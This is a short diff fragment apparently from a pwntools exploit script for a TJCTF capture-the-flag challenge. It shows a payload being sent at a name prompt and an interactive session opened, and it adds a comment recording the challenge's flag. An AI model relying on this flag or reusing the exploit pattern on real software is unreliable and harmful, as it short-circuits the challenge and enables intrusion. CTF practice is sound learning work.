@@ -74,3 +74,5 @@ log.info('Payload: ' + payload)
 io.sendlineafter("What is your name?\n", payload)
 log.success(io.recv())
 io.interactive()
+
+# tjctf{3l_p5y_k0n6r00_0ur_n3w357_l4b_m3mb3r!}
